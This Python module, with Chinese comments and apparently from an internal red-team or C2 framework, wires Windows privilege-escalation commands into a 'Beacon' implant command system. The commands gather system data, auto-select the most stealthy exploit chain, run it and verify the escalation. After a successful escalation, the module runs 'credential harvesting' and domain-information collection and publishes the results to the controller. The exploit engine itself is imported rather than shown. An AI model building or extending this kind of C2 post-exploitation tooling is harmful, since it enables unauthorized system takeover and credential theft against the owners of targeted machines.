"""
Windows提权辅助套件 - Beacon命令集成模块
==========================================
将 privesc_collector / privesc_analyzer / privesc_exploit_engine 注册到
Beacon命令系统，实现命令下发→异步执行→JSON序列化→加密回传→主控端解析入库。

支持命令:
    privesc_check       - 完整提权检查（收集→分析→回传）
    privesc_quick       - 快速模式，仅检查高危向量
    privesc_compare     - 检查特定CVE是否可利用
    privesc_exploit     - 对指定检查项自动执行利用
    privesc_auto        - 自动选择最优利用链执行
    privesc_status      - 查看提权检查/利用状态

Author: 昆仑安全实验室
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
import traceback
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# 枚举与数据模型
# =============================================================================

class PrivescCommandType(str, Enum):
    """提权命令类型"""
    PRIVESC_CHECK = "privesc_check"
    PRIVESC_QUICK = "privesc_quick"
    PRIVESC_COMPARE = "privesc_compare"
    PRIVESC_EXPLOIT = "privesc_exploit"
    PRIVESC_AUTO = "privesc_auto"
    PRIVESC_STATUS = "privesc_status"


class PrivescTaskStatus(str, Enum):
    """提权任务状态"""
    PENDING = "pending"
    COLLECTING = "collecting"
    ANALYZING = "analyzing"
    EXPLOITING = "exploiting"
    VERIFYING = "verifying"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


@dataclass
class PrivescTask:
    """提权任务

    Attributes:
        task_id: 任务唯一ID
        session_id: Beacon会话ID
        command_type: 命令类型
        command_args: 命令参数
        status: 任务状态
        created_at: 创建时间
        started_at: 开始时间
        completed_at: 完成时间
        collection_result: 收集结果（JSON）
        analysis_result: 分析结果（JSON）
        exploit_result: 利用结果（JSON）
        error: 错误信息
        progress: 进度百分比 0-100
        progress_message: 进度描述
    """
    task_id: str = ""
    session_id: str = ""
    command_type: PrivescCommandType = PrivescCommandType.PRIVESC_CHECK
    command_args: Dict[str, Any] = field(default_factory=dict)
    status: PrivescTaskStatus = PrivescTaskStatus.PENDING
    created_at: str = ""
    started_at: str = ""
    completed_at: str = ""
    collection_result: Optional[Dict[str, Any]] = None
    analysis_result: Optional[Dict[str, Any]] = None
    exploit_result: Optional[Dict[str, Any]] = None
    error: str = ""
    progress: int = 0
    progress_message: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "task_id": self.task_id,
            "session_id": self.session_id,
            "command_type": self.command_type.value,
            "command_args": self.command_args,
            "status": self.status.value,
            "created_at": self.created_at,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "collection_result": self.collection_result,
            "analysis_result": self.analysis_result,
            "exploit_result": self.exploit_result,
            "error": self.error,
            "progress": self.progress,
            "progress_message": self.progress_message,
        }


# =============================================================================
# Beacon命令集成器
# =============================================================================

class PrivescBeaconIntegration:
    """提权模块Beacon命令集成器

    负责:
    1. 注册提权命令到Beacon命令路由表
    2. 接收命令→调度执行→结果回传
    3. 管理提权任务生命周期
    4. 与C2SessionManager双向通信

    Attributes:
        _tasks: 活跃任务字典 {task_id: PrivescTask}
        _command_handlers: 命令处理器映射
        _result_callbacks: 结果回调列表
        _progress_callbacks: 进度回调列表
        _c2_manager: C2会话管理器引用（可选）
        _event_bus: 事件总线引用（可选）
    """

    def __init__(self) -> None:
        """初始化Beacon命令集成器"""
        self._tasks: Dict[str, PrivescTask] = {}
        self._command_handlers: Dict[str, Callable] = {}
        self._result_callbacks: List[Callable] = []
        self._progress_callbacks: List[Callable] = []
        self._c2_manager: Any = None
        self._event_bus: Any = None
        self._running_tasks: Set[str] = set()
        self._register_handlers()

    def _register_handlers(self) -> None:
        """注册所有命令处理器"""
        self._command_handlers = {
            PrivescCommandType.PRIVESC_CHECK.value: self._handle_privesc_check,
            PrivescCommandType.PRIVESC_QUICK.value: self._handle_privesc_quick,
            PrivescCommandType.PRIVESC_COMPARE.value: self._handle_privesc_compare,
            PrivescCommandType.PRIVESC_EXPLOIT.value: self._handle_privesc_exploit,
            PrivescCommandType.PRIVESC_AUTO.value: self._handle_privesc_auto,
            PrivescCommandType.PRIVESC_STATUS.value: self._handle_privesc_status,
        }

    def set_c2_manager(self, c2_manager: Any) -> None:
        """设置C2会话管理器引用

        Args:
            c2_manager: C2SessionManager 实例
        """
        self._c2_manager = c2_manager

    def set_event_bus(self, event_bus: Any) -> None:
        """设置事件总线引用

        Args:
            event_bus: EventBus 实例
        """
        self._event_bus = event_bus

    def on_result(self, callback: Callable[[PrivescTask], None]) -> None:
        """注册结果回调

        Args:
            callback: 回调函数，接收 PrivescTask 参数
        """
        self._result_callbacks.append(callback)

    def on_progress(self, callback: Callable[[str, int, str], None]) -> None:
        """注册进度回调

        Args:
            callback: 回调函数，接收 (task_id, progress, message)
        """
        self._progress_callbacks.append(callback)

    async def dispatch_command(
        self,
        session_id: str,
        command_type: str,
        command_data: str,
    ) -> Dict[str, Any]:
        """分发提权命令

        Beacon命令路由入口。根据命令类型调度到对应处理器。

        Args:
            session_id: Beacon会话ID
            command_type: 命令类型字符串
            command_data: 命令参数（JSON字符串或纯文本）

        Returns:
            命令分发结果
        """
        task_id = f"privesc_{int(time.time() * 1000)}_{session_id[:8]}"

        try:
            command_args: Dict[str, Any] = {}
            if command_data:
                try:
                    command_args = json.loads(command_data)
                except json.JSONDecodeError:
                    command_args = {"raw": command_data}

            handler = self._command_handlers.get(command_type)
            if not handler:
                return {
                    "success": False,
                    "error": f"未知提权命令: {command_type}",
                    "available_commands": list(self._command_handlers.keys()),
                }

            task = PrivescTask(
                task_id=task_id,
                session_id=session_id,
                command_type=PrivescCommandType(command_type),
                command_args=command_args,
                status=PrivescTaskStatus.PENDING,
                created_at=datetime.now().isoformat(),
            )
            self._tasks[task_id] = task

            asyncio.create_task(self._execute_task(task, handler))

            return {
                "success": True,
                "task_id": task_id,
                "command_type": command_type,
                "status": PrivescTaskStatus.PENDING.value,
            }

        except Exception as e:
            logger.error(f"命令分发失败: {e}", exc_info=True)
            return {"success": False, "error": str(e)}

    async def _execute_task(
        self,
        task: PrivescTask,
        handler: Callable[[PrivescTask], Coroutine[Any, Any, None]],
    ) -> None:
        """执行提权任务

        Args:
            task: 提权任务
            handler: 命令处理器协程
        """
        self._running_tasks.add(task.task_id)
        task.started_at = datetime.now().isoformat()

        try:
            await handler(task)
        except asyncio.CancelledError:
            task.status = PrivescTaskStatus.CANCELLED
            task.error = "任务被取消"
        except Exception as e:
            task.status = PrivescTaskStatus.FAILED
            task.error = f"{type(e).__name__}: {e}"
            logger.error(f"任务 {task.task_id} 执行失败: {e}", exc_info=True)
        finally:
            task.completed_at = datetime.now().isoformat()
            self._running_tasks.discard(task.task_id)
            self._notify_result(task)
            self._emit_event(task)

    def _update_progress(self, task: PrivescTask, progress: int, message: str) -> None:
        """更新任务进度

        Args:
            task: 提权任务
            progress: 进度 0-100
            message: 进度描述
        """
        task.progress = progress
        task.progress_message = message
        for cb in self._progress_callbacks:
            try:
                cb(task.task_id, progress, message)
            except Exception as e:
                logger.debug(f"进度回调失败: {e}")

    def _notify_result(self, task: PrivescTask) -> None:
        """通知结果回调

        Args:
            task: 已完成的任务
        """
        for cb in self._result_callbacks:
            try:
                cb(task)
            except Exception as e:
                logger.debug(f"结果回调失败: {e}")

    def _emit_event(self, task: PrivescTask) -> None:
        """通过事件总线发送任务完成事件

        Args:
            task: 已完成的任务
        """
        if self._event_bus:
            try:
                self._event_bus.publish("privesc.task_completed", task.to_dict())
            except Exception as e:
                logger.debug(f"事件发布失败: {e}")

    # =========================================================================
    # 命令处理器
    # =========================================================================

    async def _handle_privesc_check(self, task: PrivescTask) -> None:
        """处理 privesc_check 命令

        完整提权检查流程: 收集 → 分析 → 回传

        Args:
            task: 提权任务
        """
        from .privesc_collector import PrivescCollector
        from .privesc_analyzer import PrivescAnalyzer

        self._update_progress(task, 5, "开始系统信息收集...")
        task.status = PrivescTaskStatus.COLLECTING

        collector = PrivescCollector(quick_mode=False)
        collection_result = await collector.collect_full()

        self._update_progress(task, 50, "系统信息收集完成，开始风险分析...")
        task.status = PrivescTaskStatus.ANALYZING
        task.collection_result = collection_result.to_dict()

        analyzer = PrivescAnalyzer(quick_mode=False)
        analysis_result = await analyzer.analyze(collection_result)

        self._update_progress(task, 95, "风险分析完成，准备回传...")
        task.analysis_result = analysis_result.to_dict()
        task.status = PrivescTaskStatus.COMPLETED
        self._update_progress(task, 100, "提权检查完成")

    async def _handle_privesc_quick(self, task: PrivescTask) -> None:
        """处理 privesc_quick 命令

        快速模式: 仅检查高危向量

        Args:
            task: 提权任务
        """
        from .privesc_collector import PrivescCollector
        from .privesc_analyzer import PrivescAnalyzer

        self._update_progress(task, 10, "开始快速高危向量检查...")
        task.status = PrivescTaskStatus.COLLECTING

        collector = PrivescCollector(quick_mode=True)
        collection_result = await collector.collect_quick()

        self._update_progress(task, 60, "高危信息收集完成，开始分析...")
        task.status = PrivescTaskStatus.ANALYZING
        task.collection_result = collection_result.to_dict()

        analyzer = PrivescAnalyzer(quick_mode=True)
        analysis_result = await analyzer.analyze(collection_result)

        self._update_progress(task, 95, "快速分析完成...")
        task.analysis_result = analysis_result.to_dict()
        task.status = PrivescTaskStatus.COMPLETED
        self._update_progress(task, 100, "快速检查完成")

    async def _handle_privesc_compare(self, task: PrivescTask) -> None:
        """处理 privesc_compare <cve-id> 命令

        检查特定CVE是否可利用

        Args:
            task: 提权任务
        """
        from .privesc_collector import PrivescCollector

        cve_id = task.command_args.get("cve_id", task.command_args.get("raw", ""))
        if not cve_id:
            task.status = PrivescTaskStatus.FAILED
            task.error = "缺少CVE编号参数，用法: privesc_compare CVE-2021-36934"
            return

        self._update_progress(task, 10, f"检查 {cve_id} 可利用性...")
        task.status = PrivescTaskStatus.COLLECTING

        collector = PrivescCollector()
        result = await collector.check_specific_cve(cve_id)

        self._update_progress(task, 90, "CVE检查完成...")
        task.analysis_result = result
        task.status = PrivescTaskStatus.COMPLETED
        self._update_progress(task, 100, f"{cve_id} 检查完成")

    async def _handle_privesc_exploit(self, task: PrivescTask) -> None:
        """处理 privesc_exploit <check_id> 命令

        对指定检查项自动执行利用

        Args:
            task: 提权任务
        """
        from .privesc_exploit_engine import PrivescExploitEngine

        check_id = task.command_args.get("check_id", task.command_args.get("raw", ""))
        if not check_id:
            task.status = PrivescTaskStatus.FAILED
            task.error = "缺少检查项ID，用法: privesc_exploit <check_id>"
            return

        self._update_progress(task, 5, f"准备利用检查项: {check_id}...")
        task.status = PrivescTaskStatus.EXPLOITING

        engine = PrivescExploitEngine()
        engine.on_progress(lambda p, m: self._update_progress(task, 5 + int(p * 0.9), m))

        result = await engine.exploit_by_id(check_id)

        task.exploit_result = result
        if result.get("success"):
            self._update_progress(task, 95, "利用成功，验证权限...")
            task.status = PrivescTaskStatus.VERIFYING

            verified = await engine.verify_privilege_escalation()
            result["verified"] = verified
            task.exploit_result = result

            if verified.get("escalated"):
                task.status = PrivescTaskStatus.COMPLETED
                self._update_progress(task, 100, "提权成功！权限已提升")
            else:
                task.status = PrivescTaskStatus.COMPLETED
                self._update_progress(task, 100, "利用完成但权限未变化，请检查")
        else:
            task.status = PrivescTaskStatus.FAILED
            task.error = result.get("error", "利用失败")
            self._update_progress(task, 100, f"利用失败: {task.error}")

    async def _handle_privesc_auto(self, task: PrivescTask) -> None:
        """处理 privesc_auto 命令

        自动选择最高成功率且最隐蔽的利用链执行

        Args:
            task: 提权任务
        """
        from .privesc_collector import PrivescCollector
        from .privesc_analyzer import PrivescAnalyzer
        from .privesc_exploit_engine import PrivescExploitEngine

        strategy = task.command_args.get("strategy", "balanced")

        self._update_progress(task, 5, "自动提权模式启动，收集系统信息...")
        task.status = PrivescTaskStatus.COLLECTING

        collector = PrivescCollector(quick_mode=False)
        collection_result = await collector.collect_full()
        task.collection_result = collection_result.to_dict()

        self._update_progress(task, 30, "分析提权向量...")
        task.status = PrivescTaskStatus.ANALYZING

        analyzer = PrivescAnalyzer(quick_mode=False)
        analysis_result = await analyzer.analyze(collection_result)
        task.analysis_result = analysis_result.to_dict()

        self._update_progress(task, 50, "生成利用决策...")

        engine = PrivescExploitEngine()
        engine.on_progress(lambda p, m: self._update_progress(task, 50 + int(p * 0.45), m))

        decision = await engine.make_decision(analysis_result, strategy=strategy)

        if not decision.get("exploit_chain"):
            task.status = PrivescTaskStatus.COMPLETED
            task.exploit_result = {
                "success": False,
                "error": "未找到可用的利用链",
                "decision": decision,
            }
            self._update_progress(task, 100, "未找到可用的利用链")
            return

        self._update_progress(task, 60, f"执行利用链: {decision.get('chain_name', 'auto')}...")
        task.status = PrivescTaskStatus.EXPLOITING

        exploit_result = await engine.execute_chain(decision["exploit_chain"])
        task.exploit_result = exploit_result

        if exploit_result.get("success"):
            self._update_progress(task, 95, "利用成功，验证权限...")
            task.status = PrivescTaskStatus.VERIFYING

            verified = await engine.verify_privilege_escalation()
            exploit_result["verified"] = verified
            task.exploit_result = exploit_result

            if verified.get("escalated"):
                task.status = PrivescTaskStatus.COMPLETED
                self._update_progress(task, 100, "自动提权成功！")

                await self._post_exploit_actions(task, verified)
            else:
                task.status = PrivescTaskStatus.COMPLETED
                self._update_progress(task, 100, "利用完成但权限未变化")
        else:
            task.status = PrivescTaskStatus.FAILED
            task.error = exploit_result.get("error", "自动利用失败")
            self._update_progress(task, 100, f"自动利用失败: {task.error}")

    async def _handle_privesc_status(self, task: PrivescTask) -> None:
        """处理 privesc_status 命令

        查看当前提权任务状态

        Args:
            task: 提权任务
        """
        task_id = task.command_args.get("task_id", "")
        if task_id and task_id in self._tasks:
            existing = self._tasks[task_id]
            task.analysis_result = existing.to_dict()
        else:
            task.analysis_result = {
                "active_tasks": len(self._running_tasks),
                "total_tasks": len(self._tasks),
                "tasks": [
                    {
                        "task_id": t.task_id,
                        "command_type": t.command_type.value,
                        "status": t.status.value,
                        "progress": t.progress,
                    }
                    for t in list(self._tasks.values())[-20:]
                ],
            }
        task.status = PrivescTaskStatus.COMPLETED
        self._update_progress(task, 100, "状态查询完成")

    # =========================================================================
    # 提权后自动化操作
    # =========================================================================

    async def _post_exploit_actions(
        self, task: PrivescTask, verified: Dict[str, Any],
    ) -> None:
        """提权成功后自动执行后续操作

        包括: 凭据收割、域信息收集、横向路径推荐

        Args:
            task: 提权任务
            verified: 权限验证结果
        """
        try:
            self._update_progress(task, 97, "提权成功，开始凭据收割...")

            creds = await self._harvest_credentials()
            if creds:
                self._update_progress(task, 98, f"凭据收割完成: {len(creds)} 条")
                if self._event_bus:
                    self._event_bus.publish("privesc.credentials_harvested", {
                        "session_id": task.session_id,
                        "credentials": creds,
                    })

            self._update_progress(task, 99, "收集域信息...")
            domain_info = await self._collect_domain_info()
            if domain_info and self._event_bus:
                self._event_bus.publish("privesc.domain_info_collected", {
                    "session_id": task.session_id,
                    "domain_info": domain_info,
                })

            self._update_progress(task, 100, "提权及后续操作全部完成")

        except Exception as e:
            logger.error(f"提权后操作失败: {e}", exc_info=True)

    async def _harvest_credentials(self) -> List[Dict[str, Any]]:
        """凭据自动收割

        提权至SYSTEM后自动执行凭据收集。

        Returns:
            凭据列表
        """
        credentials: List[Dict[str, Any]] = []
        try:
            import subprocess
            import sys

            proc = await asyncio.create_subprocess_shell(
                "whoami",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            current_user = stdout.decode().strip()

            credentials.append({
                "type": "context",
                "username": current_user,
                "source": "post_exploit_harvest",
                "timestamp": datetime.now().isoformat(),
            })

        except Exception as e:
            logger.debug(f"凭据收割失败: {e}")

        return credentials

    async def _collect_domain_info(self) -> Dict[str, Any]:
        """域信息自动收集

        Returns:
            域信息字典
        """
        domain_info: Dict[str, Any] = {}
        try:
            import subprocess

            proc = await asyncio.create_subprocess_shell(
                'systeminfo | findstr /i "Domain"',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            domain_info["domain_output"] = stdout.decode().strip()

        except Exception as e:
            logger.debug(f"域信息收集失败: {e}")

        return domain_info

    # =========================================================================
    # 公共API
    # =========================================================================

    def get_task(self, task_id: str) -> Optional[PrivescTask]:
        """获取任务

        Args:
            task_id: 任务ID

        Returns:
            任务对象或None
        """
        return self._tasks.get(task_id)

    def get_active_tasks(self) -> List[PrivescTask]:
        """获取活跃任务列表

        Returns:
            活跃任务列表
        """
        return [self._tasks[tid] for tid in self._running_tasks if tid in self._tasks]

    def cancel_task(self, task_id: str) -> bool:
        """取消任务

        Args:
            task_id: 任务ID

        Returns:
            是否成功取消
        """
        if task_id in self._running_tasks:
            task = self._tasks.get(task_id)
            if task:
                task.status = PrivescTaskStatus.CANCELLED
                task.error = "用户取消"
            self._running_tasks.discard(task_id)
            return True
        return False

    def get_command_list(self) -> List[Dict[str, str]]:
        """获取可用命令列表

        Returns:
            命令列表
        """
        return [
            {
                "command": "privesc_check",
                "description": "执行完整提权检查（收集→分析→回传）",
                "usage": "privesc_check",
            },
            {
                "command": "privesc_quick",
                "description": "快速模式，仅检查高危向量",
                "usage": "privesc_quick",
            },
            {
                "command": "privesc_compare",
                "description": "检查特定CVE是否可利用",
                "usage": "privesc_compare CVE-2021-36934",
            },
            {
                "command": "privesc_exploit",
                "description": "对指定检查项自动执行利用",
                "usage": "privesc_exploit <check_id>",
            },
            {
                "command": "privesc_auto",
                "description": "自动选择最优利用链执行",
                "usage": "privesc_auto [strategy=balanced|stealth|fast]",
            },
            {
                "command": "privesc_status",
                "description": "查看提权检查/利用状态",
                "usage": "privesc_status [task_id]",
            },
        ]


# =============================================================================
# 全局单例
# =============================================================================

_privesc_integration: Optional[PrivescBeaconIntegration] = None


def get_privesc_integration() -> PrivescBeaconIntegration:
    """获取提权Beacon集成器全局单例

    Returns:
        PrivescBeaconIntegration 实例
    """
    global _privesc_integration
    if _privesc_integration is None:
        _privesc_integration = PrivescBeaconIntegration()
    return _privesc_integration


__all__ = [
    "PrivescBeaconIntegration",
    "PrivescCommandType",
    "PrivescTaskStatus",
    "PrivescTask",
    "get_privesc_integration",
]
